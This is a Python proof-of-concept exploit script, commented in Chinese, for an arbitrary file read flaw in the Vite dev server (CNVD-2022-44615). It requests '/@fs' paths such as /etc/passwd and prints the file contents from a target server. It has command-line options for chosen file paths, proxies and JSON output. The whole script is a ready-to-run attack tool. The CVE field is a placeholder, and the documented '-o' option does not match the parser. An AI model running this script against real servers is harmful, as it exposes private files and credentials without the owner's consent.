#!/usr/bin/env python3
"""
Vite Dev Server 任意文件读取漏洞 POC
CNVD编号: CNVD-2022-44615
漏洞等级: 高危 (CVSS 7.5)

==================== 漏洞描述 ====================
【漏洞原理】
Vite开发服务器在2.3.0之前版本存在任意文件读取漏洞，攻击者可通过在URL中
使用@fs前缀绕过访问限制，读取服务器上的任意文件。

【影响范围】
- Vite < 2.3.0
- Docker默认端口: 3000

【危害等级】
- 无需认证，直接读取任意文件
- CVSS评分: 7.5 (High)

==================== 环境要求 ====================
- Python 3.6+
- requests库

==================== 验证步骤 ====================
1. 基础检测:
   python cnvd_2022_44615.py http://target:3000 --check-only

2. 读取文件:
   python cnvd_2022_44615.py http://target:3000 -f /etc/passwd

3. 完整利用:
   python cnvd_2022_44615.py http://target:3000 -f /etc/passwd -o json

==================== 预期结果 ====================
- 成功时: 返回文件内容
- 失败时: 返回403禁止访问（目标已修复）或连接失败
"""

import sys
import json
import argparse
import requests
from typing import Dict, Optional
from urllib.parse import urljoin


class CNVD202244615POC:
    """Vite Dev Server 任意文件读取漏洞 POC"""

    VULN_NAME = "Vite Dev Server Arbitrary File Read"
    CNVD_ID = "CNVD-2022-44615"
    CVE_ID = "CVE-2022-xxxx"
    SEVERITY = "HIGH (CVSS 7.5)"
    AFFECTED = "Vite < 2.3.0"

    def __init__(self, target: str, timeout: int = 15, proxy: str = None,
                 verify_ssl: bool = False):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.verify_ssl = verify_ssl

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = self.verify_ssl
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        if not self.verify_ssl:
            requests.packages.urllib3.disable_warnings()
        return session

    def check(self) -> Dict:
        """
        检测目标是否存在漏洞
        步骤1: 检查Vite服务是否存活
        步骤2: 尝试读取/etc/passwd
        """
        result = {
            "vulnerability": f"{self.VULN_NAME} ({self.CNVD_ID})",
            "target": self.target,
            "status": "unknown",
            "details": [],
            "conclusion": ""
        }
        session = self._create_session()

        print("[*] 步骤1/2: 检查Vite服务状态...")
        try:
            resp = session.get(self.target, timeout=self.timeout)
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"服务不可达: {e}"
            return result
        if resp.status_code == 200:
            print(f"[+] Vite服务运行正常 (HTTP {resp.status_code})")
            result["details"].append(f"HTTP {resp.status_code}")
        else:
            result["status"] = "unknown"
            result["details"].append(f"状态码: {resp.status_code}")

        print("[*] 步骤2/2: 尝试读取/etc/passwd...")
        try:
            url = urljoin(self.target, "/@fs/etc/passwd")
            resp = session.get(url, timeout=self.timeout)
            if resp.status_code == 200 and ("root:" in resp.text or "nobody:" in resp.text):
                result["details"].append("成功读取/etc/passwd")
                result["output"] = resp.text[:500]
                result["status"] = "vulnerable"
                result["conclusion"] = "Vite服务器存在任意文件读取漏洞(CNVD-2022-44615)"
            elif resp.status_code == 403:
                result["status"] = "not_vulnerable"
                result["conclusion"] = "@fs被限制，可能已修复"
            else:
                result["status"] = "unknown"
                result["conclusion"] = f"返回状态码: {resp.status_code}"
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"请求异常: {e}"

        return result

    def exploit(self, command: str = "") -> Dict:
        """command参数作为要读取的文件路径"""
        return self.read_file(command or "/etc/passwd")

    def read_file(self, filepath: str) -> Dict:
        """
        利用漏洞读取文件
        """
        result = {
            "vulnerability": f"{self.VULN_NAME} ({self.CNVD_ID})",
            "target": self.target,
            "file": filepath,
            "status": "unknown",
            "details": [],
            "output": "",
            "conclusion": ""
        }
        session = self._create_session()

        print(f"[*] 读取文件: {filepath}")
        try:
            url = urljoin(self.target, f"/@fs{filepath}")
            resp = session.get(url, timeout=self.timeout)
            if resp.status_code == 200 and resp.text:
                result["status"] = "vulnerable"
                result["output"] = resp.text
                result["details"].append(f"文件读取成功 ({len(resp.text)} bytes)")
                result["conclusion"] = f"成功读取 {filepath}"
            elif resp.status_code == 403:
                result["status"] = "not_vulnerable"
                result["conclusion"] = f"读取 {filepath} 被禁止(403)"
            else:
                result["status"] = "error"
                result["conclusion"] = f"读取失败 (HTTP {resp.status_code})"
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"请求异常: {e}"

        return result

    def run(self, command: str = "/etc/passwd") -> Dict:
        print(f"[*] {self.VULN_NAME} ({self.CNVD_ID}) - 开始验证")
        print(f"[*] 目标: {self.target}")
        print(f"[*] 严重等级: {self.SEVERITY}")
        print("-" * 60)
        return self.read_file(command)

    def print_result(self, result: Dict):
        status = result.get("status", "unknown")
        icons = {"vulnerable": "[+]", "suspected_vulnerable": "[?]",
                 "failed": "[-]", "not_vulnerable": "[-]", "error": "[!]"}
        icon = icons.get(status, "[-]")
        print(f"\n{'=' * 60}")
        print(f"{icon} 漏洞: {result['vulnerability']}")
        print(f"    目标: {result['target']}")
        print(f"    状态: {status}")
        if result.get("file"):
            print(f"    文件: {result['file']}")
        if result.get("output"):
            out = result['output']
            print(f"    输出:\n{out[:500]}")
        print(f"    结论: {result.get('conclusion', '')}")
        print(f"{'=' * 60}")


def main():
    parser = argparse.ArgumentParser(
        description="Vite Dev Server任意文件读取漏洞验证POC (CNVD-2022-44615)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python cnvd_2022_44615.py http://target:3000 --check-only
  python cnvd_2022_44615.py http://target:3000 -f /etc/passwd
  python cnvd_2022_44615.py http://target:3000 -f /etc/passwd -o json
        """
    )
    parser.add_argument("target", help="目标URL (e.g., http://192.168.1.100:3000)")
    parser.add_argument("--check-only", action="store_true", help="仅检测不利用")
    parser.add_argument("-f", "--file", default="/etc/passwd", help="要读取的文件路径")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="请求超时(秒)")
    parser.add_argument("--proxy", help="HTTP代理")
    parser.add_argument("-k", "--insecure", action="store_true", help="跳过SSL验证")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--output", choices=["text", "json"], default="text")
    args = parser.parse_args()

    poc = CNVD202244615POC(
        target=args.target, timeout=args.timeout,
        proxy=args.proxy, verify_ssl=not args.insecure
    )

    if args.check_only:
        result = poc.check()
    else:
        result = poc.run(args.file)

    if args.output == "json":
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        poc.print_result(result)


if __name__ == "__main__":
    main()
